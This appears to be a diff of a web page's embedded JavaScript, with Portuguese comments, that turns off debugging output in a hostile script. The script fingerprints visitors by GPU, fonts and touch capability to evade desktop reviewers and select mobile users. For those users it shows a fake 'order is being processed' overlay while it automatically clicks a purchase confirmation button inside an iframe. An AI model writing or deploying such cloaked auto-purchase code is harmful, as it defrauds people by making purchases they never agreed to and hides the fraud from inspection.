@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE6</title>
+  <title>UP1</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -142,50 +142,20 @@
 	<script>
 	document.addEventListener('DOMContentLoaded', async () => {
 
-		// --- PAINEL DE DEPURAÇÃO VISUAL ---
-		function showDebugPanel(logs) {
-			// Remove o painel antigo se já existir, para não duplicar
-			const oldPanel = document.getElementById('debug-panel');
-			if (oldPanel) {
-				oldPanel.remove();
-			}
-			
-			const debugPanel = document.createElement('div');
-			debugPanel.id = 'debug-panel';
-			debugPanel.style.position = 'fixed';
-			debugPanel.style.bottom = '10px';
-			debugPanel.style.left = '10px';
-			debugPanel.style.padding = '10px';
-			debugPanel.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
-			debugPanel.style.color = 'white';
-			debugPanel.style.fontSize = '12px';
-			debugPanel.style.fontFamily = 'monospace';
-			debugPanel.style.zIndex = '9999999';
-			debugPanel.style.borderRadius = '5px';
-			debugPanel.style.lineHeight = '1.5';
-			debugPanel.innerHTML = logs.join('<br>');
-			document.body.appendChild(debugPanel);
-		}
-
-		// --- CAMADA 2: ANÁLISE DE INCONSISTÊNCIAS (RED FLAGS) ---
-		function hasRedFlags(logs) {
-			// 2.1: Análise da Placa de Vídeo (WebGL)
+		function hasRedFlags() {
 			try {
 				const canvas = document.createElement('canvas');
 				const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
 				if (gl) {
 					const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 					const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-					logs.push(`GPU: ${renderer.substring(0, 25)}...`);
 					const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
 					if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) {
-						logs.push('--> RED FLAG: GPU de Desktop!');
 						return true;
 					}
 				}
-			} catch (e) { /* Ignora erros */ }
+			} catch (e) { /* Ignora erros, foca na detecção */ }
 
-			// 2.2: Verificação de Fontes de Desktop
 			const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
 			const testString = "mmmmmmmmmmlli";
 			const testSpan = document.createElement('span');
@@ -198,122 +168,67 @@
 			defaultWidth.monospace = testSpan.offsetWidth;
 			document.body.removeChild(testSpan);
 
-			let foundDesktopFont = false;
 			for (const font of desktopFonts) {
 				 document.body.appendChild(testSpan);
 				 testSpan.style.fontFamily = `'${font}', monospace`;
 				 if(testSpan.offsetWidth !== defaultWidth.monospace) {
-					 foundDesktopFont = true;
+					 document.body.removeChild(testSpan);
+					 return true;
 				 }
 				 document.body.removeChild(testSpan);
-				 if(foundDesktopFont) break;
-			}
-			
-			if (foundDesktopFont) {
-				logs.push('--> RED FLAG: Fonte de Desktop!');
-				return true;
 			}
 
-			logs.push('Red Flags: OK');
 			return false;
 		}
 
-		// --- CAMADA 3: VERIFICAÇÃO FINAL DE CONFIANÇA ---
-		function getFinalConfidenceScore(logs) {
+		function getFinalConfidenceScore() {
 			let score = 0;
-			const touchPoints = navigator.maxTouchPoints || 0;
-			if (touchPoints > 1) {
+			if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
 				score += 3;
-				logs.push(`TouchPoints: ${touchPoints} OK (+3)`);
-			} else {
-				logs.push(`TouchPoints: ${touchPoints} FAIL (+0)`);
 			}
-
 			if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) {
 				score += 2;
-				logs.push('Pointer: Coarse OK (+2)');
-			} else {
-				logs.push('Pointer: Fine FAIL (+0)');
 			}
-			
-			logs.push(`--------------------`);
-			logs.push(`SCORE DE CONFIANÇA: ${score}`);
 			return score;
 		}
 
 
-		// --- LÓGICA PRINCIPAL DE EXECUÇÃO ---
 		async function runAntiFraudChecks() {
-			const debugLogs = ['--- Debugging Score ---'];
-
-			// Executa a Camada 2
-			const redFlagsFound = hasRedFlags(debugLogs);
+			const redFlagsFound = hasRedFlags();
 			if (redFlagsFound) {
-				showDebugPanel(debugLogs);
 				return false;
 			}
 
-			// Executa a Camada 3
-			const finalScore = getFinalConfidenceScore(debugLogs);
-			const CONFIDENCE_THRESHOLD = 5;
-			
-			if (finalScore < CONFIDENCE_THRESHOLD) {
-				debugLogs.push(`DECISÃO: BLOQUEADO (Score < ${CONFIDENCE_THRESHOLD})`);
-				showDebugPanel(debugLogs);
+			const finalScore = getFinalConfidenceScore();
+			if (finalScore < 5) {
 				return false;
 			}
 
-			debugLogs.push(`DECISÃO: EXECUTADO (Score >= ${CONFIDENCE_THRESHOLD})`);
-			showDebugPanel(debugLogs);
 			return true;
 		}
 
 
-		// --- INÍCIO DA EXECUÇÃO ---
 		const isLegitUser = await runAntiFraudChecks();
 
 		if (!isLegitUser) {
-			// Aborta silenciosamente se não for um usuário legítimo.
 			return;
 		}
 
-		// Se chegou até aqui, é um usuário real. Executa a compra automática.
 		function showLoadingScreen() {
 			const loadingCSS = `
 				<style id="loading-style">
-					.loader-container {
-					  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-					  background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif;
-					}
-					.loader-content-wrapper {
-					  position: absolute; top: 50%; left: 50%;
-					  transform: translate(-50%, -50%);
-					  display: flex; flex-direction: column; align-items: center;
-					}
-					.loader-spinner {
-					  border: 8px solid #cccccc; border-top: 8px solid #2180c0;
-					  border-radius: 50%; width: 45px; height: 45px;
-					  animation: spin 1s linear infinite; margin-bottom: 25px;
-					}
-					@keyframes spin {
-					  0% { transform: rotate(0deg); }
-					  100% { transform: rotate(360deg); }
-					}
-					.loader-text {
-					  color: #525559; font-size: 18px; text-align: center;
-					}
-					.loader-text .title {
-					  font-weight: bold; margin-bottom: 8px;
-					}
+					.loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; }
+					.loader-content-wrapper { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; }
+					.loader-spinner { border: 8px solid #cccccc; border-top: 8px solid #2180c0; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 25px; }
+					@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+					.loader-text { color: #525559; font-size: 18px; text-align: center; }
+					.loader-text .title { font-weight: bold; margin-bottom: 8px; }
 				</style>`;
 			const loadingHTML = `
 				<div id="custom-loader" class="loader-container">
 					<div class="loader-content-wrapper">
 						<div class="loader-spinner"></div>
-						<div class="loader-text">
-							<p class="title">Your order is being processed.</p>
-							<p>Do not close this page.</p>
-						</div>
+						<div class="loader-text"><p class="title">Your order is being processed.</p><p>Do not close this page.</p></div>
 					</div>
 				</div>`;
 			document.head.insertAdjacentHTML('beforeend', loadingCSS);
@@ -339,19 +254,14 @@
 			const maxTentativas = 60;
 			const intervalo = setInterval(() => {
 				tentativas++;
-				if (tentativas > maxTentativas) {
-					clearInterval(intervalo);
-					return;
-				}
+				if (tentativas > maxTentativas) { clearInterval(intervalo); return; }
 				const iframe = document.querySelector(seletorIframePopUp);
 				if (iframe) {
 					try {
 						const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
 						const botaoConfirmacao = iframeDocument.getElementById(idBotaoConfirmacaoFinal);
 						if (botaoConfirmacao) {
-							setTimeout(() => {
-								botaoConfirmacao.click();
-							}, 8000);
+							setTimeout(() => { botaoConfirmacao.click(); }, 8000);
 							clearInterval(intervalo);
 						}
 					} catch (e) {
